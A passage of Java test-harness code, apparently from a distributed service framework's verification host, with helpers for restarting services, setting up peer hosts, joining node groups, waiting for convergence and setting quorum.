testCreate(1);\n        URI u = null;\n        if (uriPath != null) {\n            u = UriUtils.buildUri(this, uriPath);\n        }\n\n        Operation post = Operation\n                .createPost(u)\n                .setBody(body)\n                .setCompletion(ctx.getCompletion());\n\n        startService(post, s);\n        ctx.await();\n        return s;\n    }\n\n    public <T extends ServiceDocument> void doServiceRestart(List<Service> services,\n            Class<T> stateType,\n            EnumSet<Service.ServiceOption> caps)\n            throws Throwable {\n        ServiceDocumentDescription sdd = buildDescription(stateType);\n        // first collect service state before shutdown so we can compare after\n        // they restart\n        Map<URI, T> statesBeforeRestart = getServiceState(null, stateType, services);\n\n        List<Service> freshServices = new ArrayList<>();\n        List<Operation> ops = new ArrayList<>();\n        for (Service s : services) {\n            // delete with no body means stop the service\n            Operation delete = Operation.createDelete(s.getUri());\n            ops.add(delete);\n        }\n        this.sender.sendAndWait(ops);\n\n        // restart services\n        TestContext ctx = testCreate(services.size());\n        for (Service oldInstance : services) {\n            Service e = oldInstance.getClass().newInstance();\n\n            for (Service.ServiceOption cap : caps) {\n                e.toggleOption(cap, true);\n            }\n\n            // use the same exact URI so the document index can find the service\n            // state by self link\n            startService(\n                    Operation.createPost(oldInstance.getUri()).setCompletion(ctx.getCompletion()),\n                    e);\n            freshServices.add(e);\n        }\n        ctx.await();\n        services = null;\n\n        Map<URI, T> statesAfterRestart = getServiceState(null, stateType, freshServices);\n\n        for (Entry<URI, T> e : statesAfterRestart.entrySet()) {\n            T stateAfter = e.getValue();\n            if (stateAfter.documentSelfLink == null) {\n                throw new IllegalStateException(\"missing selflink\");\n            }\n            if (stateAfter.documentKind == null) {\n                throw new IllegalStateException(\"missing kind\");\n            }\n\n            T stateBefore = statesBeforeRestart.get(e.getKey());\n            if (stateBefore == null) {\n                throw new IllegalStateException(\n                        \"New service has new self link, not in previous service instances\");\n            }\n\n            if (!stateBefore.documentKind.equals(stateAfter.documentKind)) {\n                throw new IllegalStateException(\"kind mismatch\");\n            }\n\n            if (!caps.contains(Service.ServiceOption.PERSISTENCE)) {\n                continue;\n            }\n\n            if (stateBefore.documentVersion != stateAfter.documentVersion) {\n                String error = String.format(\n                        \"Version mismatch. Before State: %s%n%n After state:%s\",\n                        Utils.toJson(stateBefore),\n                        Utils.toJson(stateAfter));\n                throw new IllegalStateException(error);\n            }\n\n            if (stateBefore.documentUpdateTimeMicros != stateAfter.documentUpdateTimeMicros) {\n                throw new IllegalStateException(\"update time mismatch\");\n            }\n\n            if (stateBefore.documentVersion == 0) {\n                throw new IllegalStateException(\"PUT did not appear to take place before restart\");\n            }\n            if (!ServiceDocument.equals(sdd, stateBefore, stateAfter)) {\n                throw new IllegalStateException(\"content signature mismatch\");\n            }\n        }\n\n    }\n\n    private Map<String, NodeState> peerHostIdToNodeState = new ConcurrentHashMap<>();\n    private Map<URI, URI> peerNodeGroups = new ConcurrentHashMap<>();\n    private Map<URI, VerificationHost> localPeerHosts = new ConcurrentHashMap<>();\n\n    private boolean isRemotePeerTest;\n\n    private boolean isSingleton;\n\n    public Map<URI, VerificationHost> getInProcessHostMap() {\n        return new HashMap<>(this.localPeerHosts);\n    }\n\n    public Map<URI, URI> getNodeGroupMap() {\n        return new HashMap<>(this.peerNodeGroups);\n    }\n\n    public Map<String, NodeState> getNodeStateMap() {\n        return new HashMap<>(this.peerHostIdToNodeState);\n    }\n\n    public void scheduleSynchronizationIfAutoSyncDisabled(String selectorPath) {\n        if (this.isPeerSynchronizationEnabled()) {\n            return;\n        }\n        for (VerificationHost peerHost : getInProcessHostMap().values()) {\n            peerHost.scheduleNodeGroupChangeMaintenance(selectorPath);\n            ServiceStats selectorStats = getServiceState(null, ServiceStats.class,\n                    UriUtils.buildStatsUri(peerHost, selectorPath));\n            ServiceStat synchStat = selectorStats.entries\n                    .get(ConsistentHashingNodeSelectorService.STAT_NAME_SYNCHRONIZATION_COUNT);\n            if (synchStat != null && synchStat.latestValue > 0) {\n                throw new IllegalStateException(\"Automatic synchronization was triggered\");\n            }\n        }\n    }\n\n    public void setUpPeerHosts(int localHostCount) {\n        CommandLineArgumentParser.parseFromProperties(this);\n        if (this.peerNodes == null) {\n            this.setUpLocalPeersHosts(localHostCount, null);\n        } else {\n            this.setUpWithRemotePeers(this.peerNodes);\n        }\n    }\n\n    public void setUpLocalPeersHosts(int localHostCount, Long maintIntervalMillis) {\n        testStart(localHostCount);\n        if (maintIntervalMillis == null) {\n            maintIntervalMillis = this.maintenanceIntervalMillis;\n        }\n        final long intervalMicros = TimeUnit.MILLISECONDS.toMicros(maintIntervalMillis);\n        for (int i = 0; i < localHostCount; i++) {\n            String location = this.isMultiLocationTest\n                    ? ((i < localHostCount / 2) ? LOCATION1 : LOCATION2)\n                    : null;\n            run(() -> {\n                try {\n                    this.setUpLocalPeerHost(null, intervalMicros, location);\n                } catch (Throwable e) {\n                    failIteration(e);\n                }\n            });\n        }\n        testWait();\n    }\n\n    public Map<URI, URI> getNodeGroupToFactoryMap(String factoryLink) {\n        Map<URI, URI> nodeGroupToFactoryMap = new HashMap<>();\n        for (URI nodeGroup : this.peerNodeGroups.values()) {\n            nodeGroupToFactoryMap.put(nodeGroup,\n                    UriUtils.buildUri(nodeGroup.getScheme(), nodeGroup.getHost(),\n                            nodeGroup.getPort(), factoryLink, null));\n        }\n        return nodeGroupToFactoryMap;\n    }\n\n    public VerificationHost setUpLocalPeerHost(Collection<ServiceHost> hosts,\n            long maintIntervalMicros) throws Throwable {\n        return setUpLocalPeerHost(0, maintIntervalMicros, hosts);\n    }\n\n    public VerificationHost setUpLocalPeerHost(int port, long maintIntervalMicros,\n            Collection<ServiceHost> hosts)\n            throws Throwable {\n        return setUpLocalPeerHost(port, maintIntervalMicros, hosts, null);\n    }\n\n    public VerificationHost setUpLocalPeerHost(Collection<ServiceHost> hosts,\n            long maintIntervalMicros, String location) throws Throwable {\n        return setUpLocalPeerHost(0, maintIntervalMicros, hosts, location);\n    }\n\n    public VerificationHost setUpLocalPeerHost(int port, long maintIntervalMicros,\n            Collection<ServiceHost> hosts, String location)\n            throws Throwable {\n\n        VerificationHost h = VerificationHost.create(port);\n\n        h.setPeerSynchronizationEnabled(this.isPeerSynchronizationEnabled());\n        h.setAuthorizationEnabled(this.isAuthorizationEnabled());\n\n        if (this.getCurrentHttpScheme() == HttpScheme.HTTPS_ONLY) {\n            // disable HTTP on new peer host\n            h.setPort(ServiceHost.PORT_VALUE_LISTENER_DISABLED);\n            // request a random HTTPS port\n            h.setSecurePort(0);\n        }\n\n        if (this.isAuthorizationEnabled()) {\n            h.setAuthorizationService(new AuthorizationContextService());\n        }\n        try {\n            VerificationHost.createAndAttachSSLClient(h);\n\n            // override with parent cert info.\n            // Within same node group, all hosts are required to use same cert, private key, and\n            // passphrase for now.\n            h.setCertificateFileReference(this.getState().certificateFileReference);\n            h.setPrivateKeyFileReference(this.getState().privateKeyFileReference);\n            h.setPrivateKeyPassphrase(this.getState().privateKeyPassphrase);\n            if (location != null) {\n                h.setLocation(location);\n            }\n\n            h.start();\n            h.setMaintenanceIntervalMicros(maintIntervalMicros);\n        } catch (Throwable e) {\n            throw new Exception(e);\n        }\n\n        addPeerNode(h);\n        if (hosts != null) {\n            hosts.add(h);\n        }\n        this.completeIteration();\n        return h;\n    }\n\n    public void setUpWithRemotePeers(String[] peerNodes) {\n        this.isRemotePeerTest = true;\n\n        this.peerNodeGroups.clear();\n        for (String remoteNode : peerNodes) {\n            URI remoteHostBaseURI = URI.create(remoteNode);\n            if (remoteHostBaseURI.getPort() == 80 || remoteHostBaseURI.getPort() == -1) {\n                remoteHostBaseURI = UriUtils.buildUri(remoteNode, ServiceHost.DEFAULT_PORT, \"\",\n                        null);\n            }\n\n            URI remoteNodeGroup = UriUtils.extendUri(remoteHostBaseURI,\n                    ServiceUriPaths.DEFAULT_NODE_GROUP);\n            this.peerNodeGroups.put(remoteHostBaseURI, remoteNodeGroup);\n        }\n\n    }\n\n    public void joinNodesAndVerifyConvergence(int nodeCount) throws Throwable {\n        joinNodesAndVerifyConvergence(null, nodeCount, nodeCount, null);\n    }\n\n    public boolean isRemotePeerTest() {\n        return this.isRemotePeerTest;\n    }\n\n    public int getPeerCount() {\n        return this.peerNodeGroups.size();\n    }\n\n    public URI getPeerHostUri() {\n        return getPeerServiceUri(\"\");\n    }\n\n    public URI getPeerNodeGroupUri() {\n        return getPeerServiceUri(ServiceUriPaths.DEFAULT_NODE_GROUP);\n    }\n\n    /**\n     * Randomly returns one of peer hosts.\n     */\n    public VerificationHost getPeerHost() {\n        URI hostUri = getPeerServiceUri(null);\n        if (hostUri != null) {\n            return this.localPeerHosts.get(hostUri);\n        }\n        return null;\n    }\n\n    public URI getPeerServiceUri(String link) {\n        if (!this.localPeerHosts.isEmpty()) {\n            List<URI> localPeerList = new ArrayList<>();\n            for (VerificationHost h : this.localPeerHosts.values()) {\n                if (h.isStopping() || !h.isStarted()) {\n                    continue;\n                }\n                localPeerList.add(h.getUri());\n            }\n            return getUriFromList(link, localPeerList);\n        } else {\n            List<URI> peerList = new ArrayList<>(this.peerNodeGroups.keySet());\n            return getUriFromList(link, peerList);\n        }\n    }\n\n    /**\n     * Randomly choose one uri from uriList and extend with the link\n     */\n    private URI getUriFromList(String link, List<URI> uriList) {\n        if (!uriList.isEmpty()) {\n            Collections.shuffle(uriList, new Random(System.nanoTime()));\n            URI baseUri = uriList.iterator().next();\n            return UriUtils.extendUri(baseUri, link);\n        }\n        return null;\n    }\n\n    public void createCustomNodeGroupOnPeers(String customGroupName) {\n        createCustomNodeGroupOnPeers(customGroupName, null);\n    }\n\n    public void createCustomNodeGroupOnPeers(String customGroupName,\n            Map<URI, NodeState> selfState) {\n        if (selfState == null) {\n            selfState = new HashMap<>();\n        }\n        // create a custom node group on all peer nodes\n        List<Operation> ops = new ArrayList<>();\n        for (URI peerHostBaseUri : getNodeGroupMap().keySet()) {\n            URI nodeGroupFactoryUri = UriUtils.buildUri(peerHostBaseUri,\n                    ServiceUriPaths.NODE_GROUP_FACTORY);\n            Operation op = getCreateCustomNodeGroupOperation(customGroupName, nodeGroupFactoryUri,\n                    selfState.get(peerHostBaseUri));\n            ops.add(op);\n        }\n        this.sender.sendAndWait(ops);\n    }\n\n    private Operation getCreateCustomNodeGroupOperation(String customGroupName,\n            URI nodeGroupFactoryUri,\n            NodeState selfState) {\n        NodeGroupState body = new NodeGroupState();\n        body.documentSelfLink = customGroupName;\n        if (selfState != null) {\n            body.nodes.put(selfState.id, selfState);\n        }\n        return Operation.createPost(nodeGroupFactoryUri).setBody(body);\n    }\n\n    public void joinNodesAndVerifyConvergence(String customGroupPath, int hostCount,\n            int memberCount,\n            Map<URI, EnumSet<NodeOption>> expectedOptionsPerNode)\n            throws Throwable {\n        joinNodesAndVerifyConvergence(customGroupPath, hostCount, memberCount,\n                expectedOptionsPerNode, true);\n    }\n\n    public void joinNodesAndVerifyConvergence(int hostCount, boolean waitForTimeSync)\n            throws Throwable {\n        joinNodesAndVerifyConvergence(hostCount, hostCount, waitForTimeSync);\n    }\n\n    public void joinNodesAndVerifyConvergence(int hostCount, int memberCount,\n            boolean waitForTimeSync) throws Throwable {\n        joinNodesAndVerifyConvergence(null, hostCount, memberCount, null, waitForTimeSync);\n    }\n\n    public void joinNodesAndVerifyConvergence(String customGroupPath, int hostCount,\n            int memberCount,\n            Map<URI, EnumSet<NodeOption>> expectedOptionsPerNode,\n            boolean waitForTimeSync) throws Throwable {\n\n        // invoke op as system user\n        setAuthorizationContext(getSystemAuthorizationContext());\n        if (hostCount == 0) {\n            return;\n        }\n\n        Map<URI, URI> nodeGroupPerHost = new HashMap<>();\n        if (customGroupPath != null) {\n            for (Entry<URI, URI> e : this.peerNodeGroups.entrySet()) {\n                URI ngUri = UriUtils.buildUri(e.getKey(), customGroupPath);\n                nodeGroupPerHost.put(e.getKey(), ngUri);\n            }\n        } else {\n            nodeGroupPerHost = this.peerNodeGroups;\n        }\n\n        if (this.isRemotePeerTest()) {\n            memberCount = getPeerCount();\n        }\n\n        if (!isRemotePeerTest() || (isRemotePeerTest() && this.joinNodes)) {\n            for (URI initialNodeGroupService : this.peerNodeGroups.values()) {\n                if (customGroupPath != null) {\n                    initialNodeGroupService = UriUtils.buildUri(initialNodeGroupService,\n                            customGroupPath);\n                }\n\n                for (URI nodeGroup : this.peerNodeGroups.values()) {\n                    if (customGroupPath != null) {\n                        nodeGroup = UriUtils.buildUri(nodeGroup, customGroupPath);\n                    }\n\n                    if (initialNodeGroupService.equals(nodeGroup)) {\n                        continue;\n                    }\n\n                    testStart(1);\n                    joinNodeGroup(nodeGroup, initialNodeGroupService, memberCount);\n                    testWait();\n                }\n            }\n        }\n\n        // for local or remote tests, we still want to wait for convergence\n        waitForNodeGroupConvergence(nodeGroupPerHost.values(), memberCount, null,\n                expectedOptionsPerNode, waitForTimeSync);\n\n        waitForNodeGroupIsAvailableConvergence(customGroupPath);\n\n        //reset auth context\n        setAuthorizationContext(null);\n    }\n\n    public void joinNodeGroup(URI newNodeGroupService,\n            URI nodeGroup, Integer quorum) {\n        if (nodeGroup.equals(newNodeGroupService)) {\n            return;\n        }\n\n        // to become member of a group of nodes, you send a POST to self\n        // (the local node group service) with the URI of the remote node\n        // group you wish to join\n        JoinPeerRequest joinBody = JoinPeerRequest.create(nodeGroup, quorum);\n\n        log(\"Joining %s through %s\", newNodeGroupService, nodeGroup);\n        // send the request to the node group instance we have picked as the\n        // \"initial\" one\n        send(Operation.createPost(newNodeGroupService)\n                .setBody(joinBody)\n                .setCompletion(getCompletion()));\n    }\n\n    public void joinNodeGroup(URI newNodeGroupService, URI nodeGroup) {\n        joinNodeGroup(newNodeGroupService, nodeGroup, null);\n    }\n\n    public void subscribeForNodeGroupConvergence(URI nodeGroup, int expectedAvailableCount,\n            CompletionHandler convergedCompletion) {\n\n        TestContext ctx = testCreate(1);\n        Operation subscribeToNodeGroup = Operation.createPost(\n                UriUtils.buildSubscriptionUri(nodeGroup))\n                .setCompletion(ctx.getCompletion())\n                .setReferer(getUri());\n        startSubscriptionService(subscribeToNodeGroup, (op) -> {\n            op.complete();\n            if (op.getAction() != Action.PATCH) {\n                return;\n            }\n\n            NodeGroupState ngs = op.getBody(NodeGroupState.class);\n            if (ngs.nodes == null && ngs.nodes.isEmpty()) {\n                return;\n            }\n\n            int c = 0;\n            for (NodeState ns : ngs.nodes.values()) {\n                if (ns.status == NodeStatus.AVAILABLE) {\n                    c++;\n                }\n            }\n\n            if (c != expectedAvailableCount) {\n                return;\n            }\n            convergedCompletion.handle(op, null);\n        });\n        ctx.await();\n    }\n\n    public void waitForNodeGroupIsAvailableConvergence() {\n        waitForNodeGroupIsAvailableConvergence(ServiceUriPaths.DEFAULT_NODE_GROUP);\n    }\n\n    public void waitForNodeGroupIsAvailableConvergence(String nodeGroupPath) {\n        waitForNodeGroupIsAvailableConvergence(nodeGroupPath, this.peerNodeGroups.values());\n    }\n\n    public void waitForNodeGroupIsAvailableConvergence(String nodeGroupPath,\n            Collection<URI> nodeGroupUris) {\n        if (nodeGroupPath == null) {\n            nodeGroupPath = ServiceUriPaths.DEFAULT_NODE_GROUP;\n        }\n        String finalNodeGroupPath = nodeGroupPath;\n\n        waitFor(\"Node group is not available for convergence\", () -> {\n            boolean isConverged = true;\n            for (URI nodeGroupUri : nodeGroupUris) {\n                URI u = UriUtils.buildUri(nodeGroupUri, finalNodeGroupPath);\n                URI statsUri = UriUtils.buildStatsUri(u);\n                ServiceStats stats = getServiceState(null, ServiceStats.class, statsUri);\n                ServiceStat availableStat = stats.entries.get(Service.STAT_NAME_AVAILABLE);\n                if (availableStat == null || availableStat.latestValue != Service.STAT_VALUE_TRUE) {\n                    log(\"Service stat available is missing or not 1.0\");\n                    isConverged = false;\n                    break;\n                }\n            }\n            return isConverged;\n        });\n\n    }\n\n    public void waitForNodeGroupConvergence() {\n        ArrayList<URI> nodeGroupUris = new ArrayList<>();\n        nodeGroupUris.add(UriUtils.extendUri(this.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP));\n        waitForNodeGroupConvergence(nodeGroupUris, 0, null, new HashMap<>(), false);\n    }\n\n    public void waitForNodeGroupConvergence(int memberCount) {\n        waitForNodeGroupConvergence(memberCount, null);\n    }\n\n    public void waitForNodeGroupConvergence(int healthyMemberCount, Integer totalMemberCount) {\n        waitForNodeGroupConvergence(this.peerNodeGroups.values(), healthyMemberCount,\n                totalMemberCount, true);\n    }\n\n    public void waitForNodeGroupConvergence(Collection<URI> nodeGroupUris, int healthyMemberCount,\n            Integer totalMemberCount,\n            boolean waitForTimeSync) {\n        waitForNodeGroupConvergence(nodeGroupUris, healthyMemberCount, totalMemberCount,\n                new HashMap<>(), waitForTimeSync);\n    }\n\n    /**\n     * Check node group convergence.\n     *\n     * Due to the implementation of {@link NodeGroupUtils#isNodeGroupAvailable}, quorum needs to\n     * be set less than the available node counts.\n     *\n     * Since {@link TestNodeGroupManager} requires all passing nodes to be in a same nodegroup,\n     * hosts in in-memory host map({@code this.localPeerHosts}) that do not match with the given\n     * nodegroup will be skipped for check.\n     *\n     * For existing API compatibility, keeping unused variables in signature.\n     * Only {@code nodeGroupUris} parameter is used.\n     *\n     * Sample node group URI: http://127.0.0.1:8000/core/node-groups/default\n     *\n     * @see TestNodeGroupManager#waitForConvergence()\n     */\n    public void waitForNodeGroupConvergence(Collection<URI> nodeGroupUris,\n            int healthyMemberCount,\n            Integer totalMemberCount,\n            Map<URI, EnumSet<NodeOption>> expectedOptionsPerNodeGroupUri,\n            boolean waitForTimeSync) {\n\n        Set<String> nodeGroupNames = nodeGroupUris.stream()\n                .map(URI::getPath)\n                .map(UriUtils::getLastPathSegment)\n                .collect(toSet());\n        if (nodeGroupNames.size() != 1) {\n            throw new RuntimeException(\"Multiple nodegroups are not supported. \" + nodeGroupNames);\n        }\n        String nodeGroupName = nodeGroupNames.iterator().next();\n\n        Date exp = getTestExpiration();\n        Duration timeout = Duration.between(Instant.now(), exp.toInstant());\n\n        // Convert \"http://127.0.0.1:1234/core/node-groups/default\" to \"http://127.0.0.1:1234\"\n        Set<URI> baseUris = nodeGroupUris.stream()\n                .map(uri -> uri.toString().replace(uri.getPath(), \"\"))\n                .map(URI::create)\n                .collect(toSet());\n\n        // pick up hosts that match with the base uris of given node group uris\n        Set<ServiceHost> hosts = getInProcessHostMap().values().stream()\n                .filter(host -> baseUris.contains(host.getPublicUri()))\n                .collect(toSet());\n\n        // perform \"waitForConvergence()\"\n        if (hosts != null && !hosts.isEmpty()) {\n            TestNodeGroupManager manager = new TestNodeGroupManager(nodeGroupName);\n            manager.addHosts(hosts);\n            manager.setTimeout(timeout);\n            manager.waitForConvergence();\n        } else {\n            this.waitFor(\"Node group did not converge\", () -> {\n                String nodeGroupPath = ServiceUriPaths.NODE_GROUP_FACTORY + \"/\" + nodeGroupName;\n                List<Operation> nodeGroupOps = baseUris.stream()\n                        .map(u -> UriUtils.buildUri(u, nodeGroupPath))\n                        .map(Operation::createGet)\n                        .collect(toList());\n                List<NodeGroupState> nodeGroupStates = getTestRequestSender()\n                        .sendAndWait(nodeGroupOps, NodeGroupState.class);\n\n                for (NodeGroupState nodeGroupState : nodeGroupStates) {\n                    TestContext testContext = this.testCreate(1);\n                    // placeholder operation\n                    Operation parentOp = Operation.createGet(null)\n                            .setReferer(this.getUri())\n                            .setCompletion(testContext.getCompletion());\n                    try {\n                        NodeGroupUtils.checkConvergenceFromAnyHost(this, nodeGroupState, parentOp);\n                        testContext.await();\n                    } catch (Exception e) {\n                        return false;\n                    }\n                }\n                return true;\n            });\n        }\n\n        // To be compatible with old behavior, populate peerHostIdToNodeState same way as before\n        List<Operation> nodeGroupGetOps = nodeGroupUris.stream()\n                .map(UriUtils::buildExpandLinksQueryUri)\n                .map(Operation::createGet)\n                .collect(toList());\n        List<NodeGroupState> nodeGroupStats = this.sender.sendAndWait(nodeGroupGetOps, NodeGroupState.class);\n\n        for (NodeGroupState nodeGroupStat : nodeGroupStats) {\n            for (NodeState nodeState : nodeGroupStat.nodes.values()) {\n                if (nodeState.status == NodeStatus.AVAILABLE) {\n                    this.peerHostIdToNodeState.put(nodeState.id, nodeState);\n                }\n            }\n        }\n    }\n\n    public int calculateHealthyNodeCount(NodeGroupState r) {\n        int healthyNodeCount = 0;\n        for (NodeState ns : r.nodes.values()) {\n            if (ns.status == NodeStatus.AVAILABLE) {\n                healthyNodeCount++;\n            }\n        }\n        return healthyNodeCount;\n    }\n\n    public void getNodeState(URI nodeGroup, Map<URI, NodeGroupState> nodesPerHost) {\n        getNodeState(nodeGroup, nodesPerHost, null);\n    }\n\n    public void getNodeState(URI nodeGroup, Map<URI, NodeGroupState> nodesPerHost,\n            TestContext ctx) {\n        URI u = UriUtils.buildExpandLinksQueryUri(nodeGroup);\n        Operation get = Operation.createGet(u).setCompletion((o, e) -> {\n            NodeGroupState ngs = null;\n            if (e != null) {\n                // failure is OK, since we might have just stopped a host\n                log(\"Host %s failed GET with %s\", nodeGroup, e.getMessage());\n                ngs = new NodeGroupState();\n            } else {\n                ngs = o.getBody(NodeGroupState.class);\n            }\n            synchronized (nodesPerHost) {\n                nodesPerHost.put(nodeGroup, ngs);\n            }\n            if (ctx == null) {\n                completeIteration();\n            } else {\n                ctx.completeIteration();\n            }\n        });\n        send(get);\n    }\n\n    public void validateNodes(NodeGroupState r, int expectedNodesPerGroup,\n            Map<URI, EnumSet<NodeOption>> expectedOptionsPerNode) {\n\n        int healthyNodes = 0;\n        NodeState localNode = null;\n        for (NodeState ns : r.nodes.values()) {\n            if (ns.status == NodeStatus.AVAILABLE) {\n                healthyNodes++;\n            }\n            assertTrue(ns.documentKind.equals(Utils.buildKind(NodeState.class)));\n            if (ns.documentSelfLink.endsWith(r.documentOwner)) {\n                localNode = ns;\n            }\n\n            assertTrue(ns.options != null);\n            EnumSet<NodeOption> expectedOptions = expectedOptionsPerNode.get(ns.groupReference);\n            if (expectedOptions == null) {\n                expectedOptions = NodeState.DEFAULT_OPTIONS;\n            }\n\n            for (NodeOption eo : expectedOptions) {\n                assertTrue(ns.options.contains(eo));\n            }\n\n            assertTrue(ns.id != null);\n            assertTrue(ns.groupReference != null);\n            assertTrue(ns.documentSelfLink.startsWith(ns.groupReference.getPath()));\n        }\n\n        assertTrue(healthyNodes >= expectedNodesPerGroup);\n        assertTrue(localNode != null);\n    }\n\n    public void doNodeGroupStatsVerification(Map<URI, URI> defaultNodeGroupsPerHost) {\n        waitFor(\"peer gossip stats not found\", () -> {\n            List<Operation> ops = new ArrayList<>();\n            for (URI nodeGroup : defaultNodeGroupsPerHost.values()) {\n                Operation get = Operation.createGet(UriUtils.extendUri(nodeGroup,\n                        ServiceHost.SERVICE_URI_SUFFIX_STATS));\n                ops.add(get);\n            }\n\n            int peerCount = defaultNodeGroupsPerHost.size();\n            List<Operation> results = this.sender.sendAndWait(ops);\n            for (Operation result : results) {\n                ServiceStats stats = result.getBody(ServiceStats.class);\n                if (stats.entries.isEmpty()) {\n                    return false;\n                }\n                int gossipPatchStatCount = 0;\n                for (ServiceStat st : stats.entries.values()) {\n                    if (!st.name\n                            .contains(NodeGroupService.STAT_NAME_PREFIX_GOSSIP_PATCH_DURATION)) {\n                        continue;\n                    }\n                    gossipPatchStatCount++;\n                    if (st.logHistogram == null) {\n                        return false;\n                    }\n                    if (st.timeSeriesStats == null) {\n                        return false;\n                    }\n                    if (st.version < 1) {\n                        return false;\n                    }\n                }\n                if (gossipPatchStatCount != peerCount - 1) {\n                    return false;\n                }\n            }\n            return true;\n        });\n    }\n\n    public void setNodeGroupConfig(NodeGroupConfig config) {\n        setSystemAuthorizationContext();\n        List<Operation> ops = new ArrayList<>();\n        for (URI nodeGroup : getNodeGroupMap().values()) {\n            NodeGroupState body = new NodeGroupState();\n            body.config = config;\n            body.nodes = null;\n            ops.add(Operation.createPatch(nodeGroup).setBody(body));\n        }\n        this.sender.sendAndWait(ops);\n        resetAuthorizationContext();\n    }\n\n    public void setNodeGroupQuorum(Integer quorum, URI nodeGroup) {\n        setNodeGroupQuorum(quorum, null, nodeGroup);\n    }\n\n    public void setNodeGroupQuorum(Integer quorum, Integer locationQuorum, URI nodeGroup) {\n        UpdateQuorumRequest body = UpdateQuorumRequest.create(true);\n\n        if (quorum != null) {\n            body.setMembershipQuorum(quorum);\n        }\n\n        if (locationQuorum != null) {\n            body.setLocationQuorum(locationQuorum);\n        }\n\n        this.sender.sendAndWait(Operation.createPatch(nodeGroup).setBody(body));\n    }\n\n    public void setNodeGroupQuorum(Integer quorum) throws Throwable {\n        setNodeGroupQuorum(quorum, (Integer) null);\n    }\n\n    public void setNodeGroupQuorum(Integer quorum, Integer locationQuorum) throws Throwable {\n        // we can issue the update to any one node and it will update\n        // everyone in the group\n        setSystemAuthorizationContext();\n        for (URI nodeGroup : getNodeGroupMap().values()) {\n            if (quorum != null) {\n                log(\"Changing quorum to %d on group %s\", quorum, nodeGroup);\n            }\n            if (locationQuorum != null) {\n                log(\"Changing location quorum to %d on group %s\", locationQuorum, nodeGroup);\n            }\n            setNodeGroupQuorum(quorum, locationQuorum, nodeGroup);\n            // nodes might not be joined, so we need to ask each node to set quorum\n        }\n        resetAuthorizationContext();\n\n        waitFor(\"quorum did not converge\", () -> {\n            setSystemAuthorizationContext();\n            for (URI n : this.peerNodeGroups.values()) {\n                NodeGroupState s = getServiceState(null, NodeGroupState.class, n);\n                for (NodeState ns : s.nodes.values()) {\n                    if (!NodeStatus.AVAILABLE.equals(ns.status)) {\n                        continue;\n                    }\n                    if (quorum != ns.membershipQuorum) {\n                        return false;\n                    }\n                    if (locationQuorum != null && !locationQuorum.equals(ns.locationQuorum)) {\n                        return false;\n                    }\n                }\n            }\n            resetAuthorizationContext();\n            return true;\n        });\n    }\n\n    public void waitForNodeSelectorQuorumConvergence(String nodeSelectorPath, int quorum) {\n        waitFor(\"quorum not updated\", () -> {\n            for (URI peerHostUri : getNodeGroupMap().keySet()) {\n                URI nodeSelectorUri = UriUtils.buildUri(peerHostUri, nodeSelectorPath);\n                NodeSelectorState nss = getServiceState(null, NodeSelectorState.class,\n                        nodeSelectorUri);\n                if (nss.membershipQuorum != quorum) {\n                    return false;\n                }\n            }\n            return true;\n        });\n    }\n\n    public <T extends ServiceDocument> void validateDocumentPartitioning(\n            Map<URI, T> provisioningTasks,\n            Class<T> type) {\n        Map<String, Map<String, Long>> taskToOwnerCount = new HashMap<>();\n\n        for (URI baseHostURI : getNodeGroupMap().keySet()) {\n            List<URI> documentsPerDcpHost = new ArrayList<>();\n            for (URI serviceUri : provisioningTasks.keySet()) {\n                URI u = UriUtils.extendUri(baseHostURI, serviceUri.getPath());\n                documentsPerDcpHost.add(u);\n            }\n\n            Map<URI, T> tasksOnThisHost = getServiceState(\n                    null,\n                    type, documentsPerDcpHost);\n\n            for (T task : tasksOnThisHost.values()) {\n                Map<String, Long> ownerCount = taskToOwnerCount.get(task.documentSelfLink);\n                if (ownerCount == null) {\n                    ownerCount = new HashMap<>();\n                    taskToOwnerCount.put(task.documentSelfLink, ownerCount);\n                }\n\n                Long count = ownerCount.get(task.documentOwner);\n                if (count == null) {\n                    count = 0L;\n                }\n                count++;\n                ownerCount.put(task.documentOwner, count);\n            }\n        }\n\n        // now verify that each task had a single owner assigned to it\n        for (Entry<String, Map<String, Long>> e : taskToOwnerCount.entrySet()) {\n            Map<String, Long> owners = e.getValue();\n            if (owners.size() > 1) {\n                throw new IllegalStateException(\"Multiple owners assigned on task \" + e.getKey());\n            }\n        }\n\n    }\n\n    /**\n     * @return list of full urls of the created example services\n     */\n    public List<URI> createExampleServices(ServiceHost h, long serviceCount, Long expiration) {\n        return createExampleServices(h, serviceCount, expiration, false);\n    }\n\n    /**\n     * @return list of full urls of the created example services\n     */\n    public List<URI> createExampleServices(ServiceHost h, long serviceCount, Long expiration, boolean skipAvailabilityCheck) {\n\n        if (!skipAvailabilityCheck) {\n            waitForServiceAvailable(ExampleService.FACTORY_LINK);\n        }\n\n        // create example services\n        List<Operation> ops = new ArrayList<>();\n        for (int i = 0; i < serviceCount; i++) {\n            ExampleServiceState initState = new ExampleServiceState();\n            initState.counter = 123L;\n            if (expiration != null) {\n                initState.documentExpirationTimeMicros = expiration;\n            }\n            initState.name = initState.documentSelfLink = UUID.randomUUID().toString();\n            Operation post = Operation.createPost(UriUtils.buildFactoryUri(h, ExampleService.class)).setBody(initState);\n            ops.add(post);\n        }\n        List<ExampleServiceState> result =  this.sender.sendAndWait(ops, ExampleServiceState.class);\n\n        // returns list of full url\n        return result.stream()\n                .map(state -> UriUtils.extendUri(h.getUri(), state.documentSelfLink))\n                .collect(toList());\n    }\n\n    public Date getTestExpiration() {\n        long duration = this.timeoutSeconds + this.testDurationSeconds;\n        return new Date(new Date().getTime()\n                + TimeUnit.SECONDS.toMillis(duration));\n    }\n\n    public boolean isStressTest() {\n        return this.isStressTest;\n    }\n\n    public void setStressTest(boolean isStressTest) {\n        this.isStressTest = isStressTest;\n        if (isStressTest) {\n            this.timeoutSeconds = 600;\n            this.setOperationTimeOutMicros(TimeUnit.SECONDS.toMicros(this.timeoutSeconds));\n        } else {\n            this.timeoutSeconds = (int) TimeUnit.MICROSECONDS.toSeconds(\n                    ServiceHostState.DEFAULT_OPERATION_TIMEOUT_MICROS);\n        }\n    }\n\n    public boolean isMultiLocationTest() {\n        return this.isMultiLocationTest;\n    }\n\n    public void setMultiLocationTest(boolean isMultiLocationTest) {\n        this.isMultiLocationTest = isMultiLocationTest;\n    }\n\n    public void toggleServiceOptions(URI serviceUri, EnumSet<ServiceOption> optionsToEnable,\n            EnumSet<ServiceOption> optionsToDisable) {\n\n        ServiceConfigUpdateRequest updateBody = ServiceConfigUpdateRequest.create();\n        